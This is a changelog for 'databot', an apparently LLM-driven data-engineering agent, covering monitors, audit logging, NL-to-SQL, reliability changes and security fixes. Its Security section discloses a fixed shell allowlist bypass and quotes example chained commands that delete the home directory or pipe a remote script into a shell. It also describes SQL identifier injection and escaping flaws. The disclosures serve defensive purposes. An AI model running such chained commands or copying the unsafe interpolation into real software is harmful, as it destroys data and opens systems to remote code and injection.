# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added — Operations & governance
- **Scheduled data monitors** (`databot.monitors`, `monitor` tool) — thresholded checks (row_count, null_rate, or custom sql_metric) run on a cron schedule; when `value <operator> threshold` is met, an alert is pushed to a channel. Run history is persisted; `MonitorService` runs in the gateway alongside cron; status at `GET /api/v1/monitors`.
- **Audit log** (`databot.audit`) — append-only record of every tool execution (tool, redacted args, status, duration) hooked into `ToolRegistry.execute`; `GET /api/v1/audit`, toggled by `security.audit_log`.
- **Export tool** (`export_query`) — run a read-only query and write rows to CSV/JSON in the workspace (filename sandboxed).
- **Slash commands** (`databot.core.slash`) — deterministic chat ops with no LLM round-trip: `/help`, `/clear`, `/usage`, `/tools`, `/skills`, `/status`. Handled at the agent-loop chokepoint, so they work on every channel (and the multi-agent path).
- **Saved query library** (`databot.queries`, `saved_query` tool) — save named queries with `{param}` placeholders and run them by name; parameters are rendered as escaped SQL literals (quotes doubled, backslashes/null bytes rejected so escaping holds on MySQL/ClickHouse/Hive too). `GET /api/v1/queries`.

### Changed
- `_build_components` now returns a 14-tuple (adds the slash-command handler).
- New skills: `visualization`, `monitoring` (default-enabled); `dbt`. `sql_analytics` gains `text_to_sql`, `describe_schema`, `profile_data`, `export_query`, `saved_query`.

### Changed — Reliability
- **Structured tool errors** (`databot.tools.errors`) — tools now `raise ToolError(code, message, hint, retryable)` instead of returning ad-hoc `"Error: …"` strings. `ToolRegistry.execute` renders one consistent `Error [code]: …` string for the model and records the error `code` as the audit/metrics `status` (previously a generic value or, for error *returns*, incorrectly `"ok"`), so `GET /api/v1/audit` and the `databot_tool_calls_total{status}` metric are now grouped by error code. `execute` still returns `str`, so the agent loop, multi-agent path, and MCP callers are unchanged. In-process tool composition (data-quality/profiling/monitors calling the SQL tool) is guarded so a structured error can't escape and break graceful degradation.
- **Gateway app factory** — the FastAPI app moved out of the `gateway` command into a testable `build_api(...)` factory (`databot.cli.api`); HTTP-level tests now cover `/livez`, `/readyz`, `/metrics`, `/usage`, `/audit`, `/monitors`, `/queries`. Behavior-preserving.
- **Error UX in chat:** all user-facing failures now render through a single
  `render_user_error` helper (`databot/core/error_ux.py`) — traceback-free,
  consistent across channels, and classified into actionable messages
  (auth / rate-limit / timeout / network / generic) that consume `ToolError`'s
  `hint`/`retryable`. Closes raw-error leaks in the CLI single-shot path, the
  HTTP `/message` + `/stream` endpoints, and the `/status` slash command; adds a
  top-level guard to the streaming loop.
- **Connector circuit breaker:** `RESTConnector` now fast-fails while an upstream is
  down instead of paying the full retry+backoff budget on every call. A per-connector
  3-state breaker (`databot/connectors/circuit_breaker.py`) opens after
  `failure_threshold` consecutive failures (default 5), fast-fails for
  `recovery_timeout` seconds (default 30), then trials one request to test recovery.
  A 4xx response counts as reachable and never trips it. On by default; configure or
  disable via a connector's `circuit_breaker` config (`enabled`, `failure_threshold`,
  `recovery_timeout`).
- **Message chunking across channels:** outbound replies longer than a channel's
  length limit are now split into multiple in-limit messages instead of being silently
  dropped. A shared `split_message` helper (`databot/channels/chunking.py`) splits on
  newline boundaries, hard-cuts overlong lines, and caps output at 10 chunks with a
  "…(response truncated)" notice. Applied to Telegram (4096), WhatsApp (4096), Google
  Chat (4096), and Slack (40000); Discord's existing splitter now uses the shared helper.
  Telegram additionally resends a chunk as plain text if `parse_mode: Markdown` rejects
  it (400) — e.g. a markdown entity split across a chunk boundary — so it still delivers.

### Added — Channels & testing
- **WhatsApp webhook signature verification** — the `/webhooks/whatsapp` POST handler now verifies Meta's `X-Hub-Signature-256` (HMAC-SHA256 of the raw body keyed by `app_secret`); enforced when `app_secret` is set, skipped otherwise for back-compat.
- **Real-database smoke test** (`tests/test_smoke_sqlite.py`) — exercises the SQL connector + new tools (query, read-only enforcement, schema introspection, profiling, export, saved query, monitor, data quality, NL-to-SQL grounding, audit) against an actual SQLite file, not mocks.

### Fixed
- **CI lint** — `ruff check`/`ruff format` now pass cleanly across `databot/`.
- **SQLite/DuckDB connection URL** — the SQLAlchemy URL builder emitted `sqlite://localhost//path` (invalid); file-based engines now build `sqlite:///path` correctly. Caught by a new real-database smoke test (`tests/test_smoke_sqlite.py`).
- **SQLite schema introspection** — `list_tables`/`get_schema` used `information_schema` (absent in SQLite); SQLite now uses `sqlite_master` and `pragma_table_info` aliased to the same `(column_name, data_type, is_nullable)` shape as other engines, so it works as an advertised driver and feeds `text_to_sql` correctly.
- **Saved-query parameter escaping on MySQL** — value substitution doubled quotes but not backslashes; on MySQL/ClickHouse/Hive a backslash escapes the next char inside a string literal, allowing breakout. Backslashes and null bytes in string parameters are now rejected, keeping escaping safe across engines.

### Security
- **SQL identifier injection fixed** — `SQLConnector.list_tables`/`get_schema` interpolated LLM-supplied `database`/`schema`/`table` names directly into queries (and bypassed the read-only check). All identifiers now route through a centralized, strict validator/quoter (`databot.connectors.identifiers`). The data-quality tool's local validator was consolidated into the same module.
- **Shell allowlist bypass fixed** — `ShellTool` ran the full command string through a shell, so an allowlisted `git` allowed `git; rm -rf ~` / `git && curl evil | sh`. When an allowlist is configured, commands are now executed via `argv` (no shell) and shell metacharacters are rejected.

### Added — Context & cost intelligence
- **Token budgeting** (`databot.core.tokens`) — every LLM request is trimmed to fit the model's context window (litellm-aware with a heuristic fallback), preserving system messages and never orphaning tool results.
- **Conversation compaction** (`databot.core.compaction`) — old turns are summarized into a running brief instead of being silently dropped; the summary persists on the session and is injected as a system message.
- **Anthropic prompt caching** (`databot.providers.caching`) — the stable system prompt + tool definitions carry `cache_control` breakpoints, cutting cost/latency on multi-turn conversations. No-op for non-Anthropic models.
- **LLM cost tracking & budgets** (`databot.core.cost`) — per-session and global token/dollar accounting (litellm pricing with a static fallback) plus an optional `agent.session_cost_budget_usd` cap enforced before each turn. Exposed at `GET /api/v1/usage` and in `/api/v1/stats`.

### Added — Production observability
- **Prometheus metrics** (`databot.observability.metrics`) — `/metrics` endpoint with message/tool/LLM counters, latency histograms, and cost/error totals. Graceful no-op when `prometheus_client` is absent.
- **Readiness/liveness probes** — `GET /livez` (process up) and `GET /readyz` (returns 503 when a connector is unreachable) for Kubernetes-style orchestration.

### Added — Data capabilities
- **Data profiling tool** (`profile_data`) — per-column null rate, distinct count, and min/max for a table, with automatic column discovery and data-quality flagging (high-null, constant, all-null columns). Part of the `sql_analytics` skill.
- **NL-to-SQL tool** (`text_to_sql`) — generates a read-only SQL query from a natural-language question, grounded in the connection's real schema (tables + columns via hardened introspection), validated read-only before it is ever returned or executed; optional execution.
- **Schema introspection tool** (`describe_schema`) — exposes list-databases/list-tables/describe-table to the agent (connector-backed, with an `information_schema` fallback).
- **Chart tool** (`chart`) — renders bar/line/sparkline charts as Unicode text that displays in any channel; new default-enabled `visualization` skill.
- **dbt tool** (`dbt`) — parses `manifest.json` to list/describe models, trace upstream/downstream lineage, and inspect tests and sources; new `dbt` skill and `tools.dbt` config.

### Changed — Intelligence
- **Multi-agent path is now session-aware** — the delegator loads conversation history, compacts old turns into a running summary (injected as a system message), and persists each turn. Previously multi-agent mode had no memory and no compaction.
- **Multi-agent path now cost-aware** — the delegator/router/specialists record per-session token usage + cost, fit each request to the context window, and enforce the per-session budget (previously single-agent only).
- **Centralized usage recording** — a shared `core.cost.record_llm_usage` is used by the agent loop, multi-agent specialists/router, and the `text_to_sql` tool, so no LLM call's cost is silently dropped.
- **RAG relevance threshold** — `rag.max_distance` drops weakly-related documents so irrelevant context is never injected (0 disables).

### Changed
- `agent` config gains `prompt_caching`, `context_budget_ratio`, `compaction_*`, and `session_cost_budget_usd`; `observability` gains `metrics_enabled`.
- `_build_components` now returns a 13-tuple (adds the usage tracker and compactor); `_register_tools` takes the provider for NL-to-SQL.
- ~98 new tests (386 total, 10 skipped) covering identifier safety, shell hardening, token budgeting, cost/budgets, prompt caching (+fail-safe), compaction, metrics, profiling, NL-to-SQL, schema introspection, charts, multi-agent cost wiring, RAG threshold, and dbt.

## [0.3.0] - 2026-02-11

### Added
- **Skills system** — 8 built-in skills (filesystem, shell, web_search, sql, airflow, lineage, streaming, catalog) that group tools into toggleable bundles
- **Embedded dashboard UI** — single-page HTML served at `/ui` with Chat, Sessions, Skills, Tools, Connectors, and Status tabs
- **Onboarding wizard** — `databot init` interactive setup for first-time configuration
- **Skills API** — `GET/PUT /api/v1/skills` for runtime skill management
- **Tool execution timeout** — `asyncio.wait_for()` enforces 120s default timeout per tool, preventing hung tools from blocking the agent loop; per-tool override via `BaseTool.timeout`
- **Session cache LRU eviction** — `OrderedDict`-based LRU with configurable `max_cached_sessions` (default 256); evicted sessions auto-persisted to SQLite
- **Bounded message queues** — `MessageBus` queues capped at 1000 messages (configurable) with back-pressure; observable via `.inbound_size`/`.outbound_size`
- **Gateway startup health check** — verifies LLM provider config, logs unreachable connectors, reports tool/skill/connector counts before accepting traffic
- **Health check TTL caching** — `ConnectorRegistry.health_check_all()` caches results for 30s, refreshes stale entries in parallel
- 10 new tests for LRU eviction, tool timeout, bounded queues, parallel handlers, parallel connectors, and health-check caching (208 total, 10 skipped)

### Changed
- **Parallel handler dispatch** — outbound and stream handlers in `MessageBus` now use `asyncio.gather()` instead of sequential execution; a slow/failing handler no longer blocks others
- **Parallel connector lifecycle** — `connect_all()` and `disconnect_all()` in `ConnectorRegistry` use `asyncio.gather()` for concurrent initialization
- **SQLite WAL mode** — `SessionStore`, `MemoryManager`, and `CronStore` use `PRAGMA journal_mode=WAL` + `busy_timeout=5000` for better concurrent-read performance
- **SQLite connection reuse** — thread-local connections eliminate per-operation reconnect overhead across all three SQLite stores
- **Configurable session message limit** — `agent.max_session_messages` from config now wired through `SessionManager` to `Session` (previously hard-coded to 50)

### Fixed
- `POST /api/v1/message` — returns structured JSON error instead of raw 500 when API key is missing
- `POST /api/v1/stream` — yields SSE error event instead of crashing when API key is missing
- `DELETE /api/v1/sessions/{key}` — removed erroneous `await` on sync `sessions.delete()` method
- Empty message validation — both chat endpoints now return 400 for empty/whitespace messages

## [0.2.0] - 2026-02-07

### Added
- **Connector framework** — pluggable SQL, REST, Spark, Kafka, and Data Catalog connectors with factory pattern
- **MCP (Model Context Protocol) server** — expose databot tools over stdio/SSE for IDE integration
- **Multi-agent architecture** — coordinator delegates to specialist sub-agents (SQL, pipeline, quality)
- **RAG pipeline** — ChromaDB-backed document retrieval for runbook-augmented answers
- **Observability** — OpenTelemetry tracing with span context, distributed trace propagation
- **SSE streaming** — real-time token streaming via Server-Sent Events endpoint
- **Connector config** in YAML — declare SQL/Spark/Kafka/Catalog connections with health checks
- Spark tool — job submission, status, logs, cluster info via Spark REST API
- Kafka tool — topic listing, consumer group lag, message peek via Kafka REST Proxy
- Catalog tool — dataset search, schema/lineage/quality lookup via data catalog APIs
- Integration bootstrap — `_build_components` wires connectors, RAG, multi-agent, tracing into CLI/gateway
- `databot mcp` CLI command to launch MCP server

### Changed
- `SQLTool` and `AirflowTool` now delegate to connectors instead of direct DB/HTTP calls
- Agent loop supports streaming token callbacks
- Gateway serves SSE stream at `/v1/stream`

### v0.1.1 (included)
- **Slack channel** integration via Slack Bolt (Socket Mode + HTTP)
- **Discord channel** integration via discord.py
- **Gateway authentication** with API key support (`Authorization: Bearer` and `X-API-Key` headers)
- **Rate limiting** middleware for the gateway (configurable RPM per client IP)
- **Human-in-the-loop tool approval** — configure sensitive tools that require user confirmation
- **Web search tool** now wired up in agent mode (previously only existed as code)
- **Token usage tracking** — cumulative prompt/completion token counts per provider
- **LLM retry with exponential backoff** — configurable retry attempts for transient failures
- **CORS support** for the gateway
- **SQL identifier validation** in Data Quality tool to prevent SQL injection
- **Multi-statement detection** in SQL read-only enforcement
- **CTE write detection** (e.g., `WITH cte AS (...) INSERT INTO ...`)
- Comprehensive test suite: 188 tests covering all modules
- CHANGELOG.md, CODE_OF_CONDUCT.md, issue templates, PR template
- Docker security hardening (non-root user, read-only filesystem)

### Security
- SQL injection prevention in Data Quality tool via identifier validation
- Enhanced SQL read-only enforcement: multi-statement blocking, CTE+write detection, expanded keyword list
- Gateway API endpoints protected with API key authentication
- Rate limiting prevents LLM cost explosion from abuse
- Docker container runs as non-root user
- Sanitized error messages prevent information leakage

## [0.1.0] - 2025-12-01

### Added
- Initial release
- Core agent loop with multi-turn tool calling
- SQL, Airflow, Data Quality, Lineage, Shell, Filesystem, Web, Cron tools
- Google Chat channel (webhook + app modes)
- CLI channel with Rich rendering
- LiteLLM multi-provider support
- SQLite-backed sessions, memory, and cron storage
- Plugin system via Python entry points
- Pydantic v2 configuration with YAML + env var substitution
- Docker + Kubernetes deployment manifests
- CI/CD pipeline with GitHub Actions
